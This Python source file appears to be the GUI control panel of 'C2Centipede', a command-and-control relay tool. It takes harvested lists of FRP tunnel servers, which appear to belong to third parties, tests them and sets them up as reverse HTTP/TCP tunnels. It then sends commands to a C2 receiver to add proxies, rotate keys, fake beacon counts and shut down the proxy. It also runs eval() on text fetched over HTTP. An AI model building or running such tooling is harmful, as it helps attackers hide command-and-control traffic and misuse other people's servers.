import PySimpleGUI as sg
import requests
from requests.auth import HTTPBasicAuth
import random, string
import utils.ip2vhost
from utils.python_httpserver_validate_reverseproxy import validate
import subprocess
import traceback

import shlex

terminal_cmdline = 'konsole --hold -e ' #KDE users
#terminal_cmdline = 'gnome-terminal -- /bin/bash -c' #Gnome users, needs a bit more work see https://stackoverflow.com/questions/46060885/how-to-kill-subprocess-in-gnome-terminal

terminal_cmdline = shlex.split(terminal_cmdline)

saved_sent_servers = []
saved_setup_servers = []

def merge_two_dicts(x, y):
    z = x.copy()  # start with x's keys and values
    z.update(y)  # modifies z with y's keys and values & returns None
    return z

sg.theme('DarkPurple6')  # Add a little color to your windows
# All the stuff inside your window. This is the PSG magic code compactor...

available_servers = [x.strip() for x in open("valid_frp_tcp_clean_unique.txt", "r").readlines()]
available_servers.extend([x.strip() for x in open("valid_frp_web_clean_unique.txt", "r").readlines()])

sample1 = list(range(1, 50))
sample2 = []

layout = [[sg.Text("C2Centipede Receiver "), sg.InputText("127.0.0.1:9093", key='-PROXADDR-', enable_events=True), sg.Text("User:"), sg.InputText(key='-PROXUSER-',size=(25,25)), sg.Text("Password:"), sg.InputText(password_char="*",key='-PROXPASSWD-',size=(25,25))],
          [sg.Text("C2Centipede Client "),
           sg.Combo(['choice 1', 'choice 2', 'choice 3'], key='-CLIENTSESSION-', enable_events=True),
           sg.Button("REFRESH CLIENTS")],
          [sg.Text("REVERSE TUNNEL MODE (HTTP||TCP)"),
           sg.Combo(values=("HTTP", "TCP"), size=(15, 10), key='reverse_tunnel_mode', enable_events=True),
           sg.Button("CHANGE REVERSE TUNNEL MODE")],
          [sg.Text("FAKE BEACON ANSWERS")],
          [sg.Text("MIN"),
           sg.Slider(range=(0, 100), default_value=1, size=(20, 15), orientation='horizontal', font=('Helvetica', 12),
                     key='-MIN-', enable_events=True)],
          [sg.Text("MAX"),
           sg.Slider(range=(0, 100), default_value=5, size=(20, 15), orientation='horizontal', font=('Helvetica', 12),
                     key='-MAX-', enable_events=True)],
          [sg.Button("SEND FAKE BEACON VALUES")],
          [sg.HSeparator()],
          [sg.Text("PROXY SPREAD MODE"),
           sg.Combo(values=("spread_chunks", "least_used"), size=(35, 30), key='spreadmode', enable_events=True),
           sg.Button("CHANGE SPREAD MODE")],
          [sg.HSeparator()],
          [sg.Listbox(values=available_servers, enable_events=True, size=(40, 20), key='-CANDIDATES-'),
           sg.Listbox(values=sample2, enable_events=True, size=(40, 20), key='-USING-')],
          [sg.Button("Test All Servers"), sg.Button("Test Server"), sg.Button("--->"), sg.Button("<---"),
           sg.Button("SETUP TUNNEL SERVERS"), sg.Button("SEND SERVERS"), sg.Button("EXPORT LIST"), sg.Button("SEND MULTIPLE SERVERS")],
          [sg.HSeparator()],
          [sg.Button("ROTATE KEY")],
          [sg.HSeparator()],
          [sg.Button("SHUT DOWN PROXY")],
          ]


def make_frpc_ini(server=None, vhost=None, local_port=None, remote_port=None):
    if remote_port != None:
        make_frpc_ini_tcp(server, remote_port, local_port)
        return True

    elif vhost != None:
        make_frpc_ini_web(server, vhost, local_port)
        return True

    else:
        print("which frpc should i do?")
        return False


def make_frpc_ini_web(server, vhost, local_port):
    template = """[common]
server_addr = %s
server_port = 7000

[%s]
type = http
custom_domains = %s
local_port = %s""" % (
    server, ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10)), vhost, local_port)

    fwr = open("./frp/inifiles/" + server.replace(":", "_") + "_web", "w")
    fwr.write(template)
    fwr.close()
    return True


def make_frpc_ini_tcp(server, remote_port, local_port):
    template = """[common]
server_addr = %s
server_port = 7000

[UWU]
type = tcp
local_ip = 127.0.0.1
local_port = %s
remote_port = %s""" % (server, local_port, remote_port)
    fwr = open("./frp/inifiles/%s_%s" % (server, remote_port), "w")
    fwr.write(template)
    fwr.close()
    return True


def test_server_http(server):
    # print("make frpc ini")
    vhost = ip2vhost.getname(server)
    local_port = random.randint(1025, 65535)
    make_frpc_ini(server=server, vhost=vhost, local_port=local_port)
    # print("open client frp")
    #proceso = subprocess.Popen(["konsole", "--hold", "-e", "./frp/frpc -c ./frp/inifiles/%s_web" % (server)])
    proceso = subprocess.Popen(terminal_cmdline+["./frp/frpc -c ./frp/inifiles/%s_web" % (server)])
    print("PROCESO",proceso)
    import time
    time.sleep(4)
    # print("validate",serverport)
    valid = validate(server=server, vhost=vhost, local_port=local_port)
    proceso.terminate()
    print("valid", server, local_port, valid)
    return valid


def test_server_tcp(server):
    # print("make frpc ini")
    remote_port = 2222
    local_port = random.randint(1025, 65535)
    make_frpc_ini(server=server, remote_port=remote_port, local_port=local_port)
    # print("open client frp")
    proceso = subprocess.Popen(
        terminal_cmdline+["./frp/frpc -c ./frp/inifiles/%s_%s" % (server, remote_port)])
    import time
    time.sleep(4)
    # print("validate",serverport)
    valid = validate(server=server, remote_port=remote_port, local_port=local_port)
    proceso.terminate()
    print("valid", server, valid)
    return valid


def setup_and_send_servers(listservers, setup=True, send=True):
    global saved_sent_servers
    global saved_setup_servers
    print("in send servers", listservers)
    for server in listservers:

            ip, remote_port = server.split(":")
            server = server.replace("W", "")
            if "W" in ip:
                """It is a reverse http proxy"""
                ip = ip.replace("W", "")
                print("its web", ip)
                # its a web revproxy so we can send a vhost
                if setup:
                    if server not in saved_setup_servers:
                        make_frpc_ini(server=ip, vhost=ip2vhost.getname(ip), local_port=values['-PROXADDR-'].split(":")[1])
                        subprocess.Popen(["konsole", "--hold", "-e", "bash -c 'echo %s;./frp/frpc -c ./frp/inifiles/%s_web'" % (ip,ip)])
                        saved_setup_servers.append(server)

                if send:
                    if server not in saved_sent_servers:
                        requests.put("http://%s/%s/addServer('%s')" % (values['-PROXADDR-'], values['-CLIENTSESSION-'], server.replace("W:", ":")))
                        saved_sent_servers.append(server)

            else:
                """its a tcp revtunnel so lets use a port"""
                if setup:
                    if server not in saved_setup_servers:
                        make_frpc_ini(server=ip, remote_port=port, local_port=values['-PROXADDR-'].split(":")[1])
                        subprocess.Popen(["konsole", "--hold", "-e", "bash -c 'echo %s %s;./frp/frpc -c ./frp/inifiles/%s_%s'" % (ip, remote_port,ip, remote_port)])
                        saved_setup_servers.append(server)

                if send:
                    if server not in saved_sent_servers:
                        requests.put("http://%s/%s/addServer('%s')" % (values['-PROXADDR-'], values['-CLIENTSESSION-'], server))
                        saved_sent_servers.append(server)
                    else:
                            print("server was already sent",server)


def remove_server(server):
    saved_sent_servers.remove(server)
    saved_setup_servers.remove(server)


# Create the Window
window = sg.Window('C2Centipede', layout, element_justification='c')
# Event Loop to process "events"
while True:
    event, values = window.read()
    print(event, values)
    values['-CLIENTSESSION-'] = values['-CLIENTSESSION-'].split("-")[0]

    if event in (sg.WIN_CLOSED, 'CANCEL'):
        break

    if event == "-MIN-":
        if int(values['-MAX-']) <= int(values['-MIN-']):
            window['-MAX-'].update(int(values['-MIN-']))

    if event == "-MAX-":
        if int(values['-MAX-']) <= int(values['-MIN-']):
            window['-MIN-'].update(int(values['-MAX-']))

    if event == "SEND FAKE BEACON VALUES":
        print("clicked SEND")
        print("http://%s/modifySimulateNumbers(%d,%d)" % (values['-PROXADDR-'], values['-MIN-'], values['-MAX-']))
        #import time
        #time.sleep(4)
        requests.put("http://%s/%s/modifySimulateNumbers(%d,%d)" % (values['-PROXADDR-'], values['-CLIENTSESSION-'], values['-MIN-'], values['-MAX-']),auth=HTTPBasicAuth(values['-PROXUSER-'], values['-PROXPASSWD-']))

    if event == "ROTATE KEY":
        print("clicked ROTATE KEY")
        requests.put("http://%s/%s/rotateKey" % (values['-PROXADDR-'], values['-CLIENTSESSION-']),auth=HTTPBasicAuth(values['-PROXUSER-'], values['-PROXPASSWD-']))

    if event == "SHUT DOWN PROXY":
        requests.put("http://%s/%s/reactor.stop()" % (values['-PROXADDR-'], values['-CLIENTSESSION-']),auth=HTTPBasicAuth(values['-PROXUSER-'], values['-PROXPASSWD-']))

    if event == "CHANGE SPREAD MODE":
        requests.put("http://%s/%s/modifySpreadMode('%s')" % (values['-PROXADDR-'], values['-CLIENTSESSION-'], values['spreadmode']),auth=HTTPBasicAuth(values['-PROXUSER-'], values['-PROXPASSWD-']))

    if event == "Test All Servers":
        for server in window.Element('-CANDIDATES-').Values:
            resulttest_tcp = test_server_tcp(server=server)
            print("result test tcp", resulttest_tcp)
            resulttest_web = test_server_http(server=server)
            print("result test web", resulttest_web)

    if event == "Test Server":

        print(values['-CANDIDATES-'][0])

        try:
            resulttest_tcp = test_server_tcp(server=values['-CANDIDATES-'][0].replace("W", ""))
            print("result test tcp", resulttest_tcp)
        except:
            traceback.print_exc()
        try:
            resulttest_web = test_server_http(server=values['-CANDIDATES-'][0].replace("W", ""))
            print("result test web", resulttest_web)
        except:
            traceback.print_exc()

    if event == "--->":
        try:
            port = sg.popup_get_text('Which port for host {}?'.format(values['-CANDIDATES-'][0]))
        except:
            port = None

        if port:
            print(values['-CANDIDATES-'][0])
            print(port)

            newvalues = window.Element('-USING-').Values
            newvalues.append(values['-CANDIDATES-'][0] + ":" + port)
            print(newvalues)
            window.Element('-USING-').Update(values=newvalues)

    if event == "<---":
        if len(values['-USING-']) > 0:
            newvalues = window.Element('-USING-').Values
            newvalues.remove(values['-USING-'][0])
            print(newvalues)
            window.Element('-USING-').Update(values=newvalues)
            try:
                saved_setup_servers.remove(values['-USING-'][0].replace("W",""))
                saved_sent_servers.remove(values['-USING-'][0].replace("W",""))
            except ValueError:
                print("value was not found in saved_sent_servers, probably was only setup but not sent,")

    if event == "SEND SERVERS":
        setup_and_send_servers(window.Element('-USING-').Values, setup=False, send=True)

    if event == "SETUP TUNNEL SERVERS":
        setup_and_send_servers(window.Element('-USING-').Values, setup=True, send=False)

    if event == "REFRESH CLIENTS":
        cl = requests.get("http://%s/clients" % (values['-PROXADDR-']))
        clients = eval(cl.text)
        window.Element('-CLIENTSESSION-').Update(values=clients)
        print(clients)

    if event == "SEND MULTIPLE SERVERS":
        # text = sg.popup_get_text('Add Server', 'Input Server String',size=(20,20))
        layout = [[]]
        layout += [
            [sg.Text("Add servers", auto_size_text=True)],
            [sg.Multiline(size=(80, 30), key='_MLINPUT_')],
            [sg.Button('Ok', size=(6, 1), bind_return_key=True), sg.Button('Cancel', size=(6, 1))]]

        window2 = sg.Window(title="Add servers", layout=layout, finalize=True, modal=True)
        buttond, valuesd = window2.read()
        if valuesd != None and valuesd["_MLINPUT_"]:
            print("??")
            print(buttond)
            valuesd["_MLINPUT_"] = [x.strip() for x in valuesd["_MLINPUT_"].split("\n") if len(x) > 0]
            print(valuesd["_MLINPUT_"])
            print("??")

            for server in valuesd["_MLINPUT_"]:
                requests.put("http://%s/%s/addServer('%s')" % (
                values['-PROXADDR-'], values['-CLIENTSESSION-'].replace("W:", ":"), server))
                newvalues = window.Element('-USING-').Values
                newvalues.append(server)
                print(newvalues)
                window.Element('-USING-').Update(values=newvalues)
        else:
            print("No server added")

        window2.close()

    if event == "EXPORT LIST":
        print(" ".join(saved_setup_servers))

        layout = [[]]
        layout += [
            [sg.Text("Server list", auto_size_text=True)],
            [sg.Multiline(size=(80, 30), key='_MLTEXT_',default_text="\n".join(saved_setup_servers)+"\n"*2+ "=" *20 + "\n"*2 +" ".join(saved_setup_servers))],
            [sg.Button('Ok', size=(6, 1), bind_return_key=True)]]

        window2 = sg.Window(title="Server list", layout=layout, finalize=True, modal=True)
        buttond, valuesd = window2.read()
        window2.close()

window.close()